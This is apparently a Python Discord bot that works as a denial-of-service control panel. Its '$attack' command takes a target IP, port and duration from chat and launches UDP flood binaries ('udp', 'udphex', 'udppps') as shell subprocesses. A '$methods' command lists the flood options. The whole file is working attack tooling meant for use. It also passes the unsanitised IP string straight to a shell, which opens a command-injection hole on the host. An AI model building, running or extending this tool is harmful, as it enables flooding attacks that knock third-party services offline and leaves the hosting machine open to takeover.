import os
import discord
from discord.ext import commands
import asyncio

# Lee EL TOKEN directamente desde la variable de entorno KEYS (se espera que el secret de GitHub Actions
# se haya expuesto como env var KEYS). Si no está definido, termina con error.
TOKEN = os.getenv('KEYS')
if not TOKEN:
    print("ERROR: No se ha encontrado el token de Discord, define la variable de entorno KEYS (por ejemplo desde secrets.KEYS en GitHub Actions).")
    exit(1)

# Prefijo para los comandos del bot
BOT_PREFIX = '$'

# Inicializa el bot con intents básicos
intents = discord.Intents.default()
intents.message_content = True  # Necesario para leer los mensajes
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

# Evento que se ejecuta cuando el bot está listo
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))

# Función para ejecutar el ataque y notificar al terminar
async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        # Espera a que termine y captura salida (no se enviará al canal)
        stdout, stderr = await proceso.communicate()

        # Envía mensaje al canal indicando que el ataque finalizó (sin código de salida ni salida del proceso)
        try:
            await ctx.send(f"Attack {ip}:{port} finished {tiempo}")
        except Exception as e:
            # En caso de que no se pueda enviar el mensaje al canal (por permisos, ctx expirado, etc.)
            print(f"No pude enviar el mensaje de finalización al canal: {e}")

        print(f"El ataque con comando '{comando}' finished")
    except Exception as e:
        print(f"Error al ejecutar el ataque: {e}")
        try:
            await ctx.send(f'Error al ejecutar el ataque: {e}')
        except:
            pass

# Comando !attack
@bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
async def attack(ctx, metodo: str, ip: str, port: int, tiempo: int):
    """
    Attack udpflood, attack udphex, attack udppps mayor PPS
    """
    if metodo == 'udp':
        # Construye el comando para udp (antiguo udphexv1) con los valores por defecto
        comando = f'./udp {ip} {port} -t 32 -s 64 -d {tiempo}'
        await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
    elif metodo == 'udphex':
        # Construye el comando para udphex (antiguo udphexv2)
        comando = f'./udphex {ip} {port} {tiempo}'
        await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
    elif metodo == 'udppps':
        # Construye el comando para el nuevo método udppps
        comando = f'./udppps {ip} {port} {tiempo}'
        await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
    else:
        await ctx.send('Métodos disponibles: udp, udphex, udppps')
        return

    # Ejecuta el comando en un proceso separado (fire and forget) y notifica al terminar
    try:
        asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port, tiempo))
    except Exception as e:
        await ctx.send(f'Error attack: {e}')

# Comando !methods - Muestra los métodos disponibles
@bot.command(name='methods', help='Metodos de ataque')
async def show_methods(ctx):
    methods_info = """
**Métodos disponibles:**
• **udp** - Método UDPFlood, consumo mayor de la cpu
  `!attack udp <ip> <puerto> <tiempo>`
• **udphex** - Método UDPHEX
  `!attack udphex <ip> <puerto> <tiempo>`
• **udppps** - Metodo UDPpps, the best power
  `!attack udppps <ip> <puerto> <tiempo>`
    """
    await ctx.send(methods_info)

# Inicia el bot
bot.run(TOKEN)
